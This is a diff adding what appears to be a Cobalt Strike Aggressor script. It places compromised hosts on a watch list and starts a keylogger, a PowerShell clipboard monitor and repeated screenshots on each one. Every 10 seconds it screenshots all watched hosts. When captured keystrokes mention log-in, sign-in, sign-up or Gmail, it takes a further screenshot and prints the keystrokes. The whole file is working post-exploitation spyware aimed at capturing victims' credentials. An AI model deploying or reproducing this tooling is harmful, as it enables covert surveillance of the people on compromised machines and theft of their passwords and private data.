@@ -1,0 +1,70 @@
+
+global('@watchlist');
+
+sub addwatch {
+  if ($1 !in @watchlist) {
+    add(@watchlist, $1);
+    	btask($1,"Added $1 to Watch List");
+   	bkeylogger($1);
+    	btask($1,"Started keylogger on bid $1");
+	bpowershell_import($1, script_resource("scripts/clipboard-monitor.ps1"));
+        bpowershell($1, "Start-ClipboardMonitor");
+    	btask($1,"Started Clipboard Monitor on bid $1");
+    	btask($1,"screenshot on bid $1");
+   	bscreenshot($1,0);
+  	bnote($1,"On watch list");
+
+	#btask($1,"ExplorePid " . getexppid());
+  }
+  else {
+    btask($1,"$1 is already on Watch List");
+  }
+}
+
+sub removewatch {
+  if ($1 in @watchlist){
+    @rem = @($1);
+    @watchlist = removeAll(@watchlist, @rem);
+    btask($1,"Removed $1 from Watch Lists");
+    bnote($1,"");
+    }
+  else {
+    btask($1,"$1 is not being watched");
+  }
+}
+
+
+alias addtowatchlist {
+  addwatch($1);
+}
+
+alias removefromwatchlist {
+  removewatch($1);
+}
+alias watching {
+  btask($1,@watchlist);
+}
+
+
+
+on heartbeat_10s {
+
+	#foreach $bid (@watchlist) {
+
+	bscreenshot(@watchlist);
+
+	#}
+}
+
+
+on keystrokes {
+
+    if('**log*in**' iswm lc($1) || '**sign*up**' iswm lc($1) || '**sign*in**' iswm lc($1) || '**gmail**' iswm lc($1)) {
+             println("MATCHED KEY WORD:");
+                btask($1['bid'],"Auto screenshot");
+                bscreenshot($1['bid'], 0);
+                println($1['data']);
+         }
+
+}
+
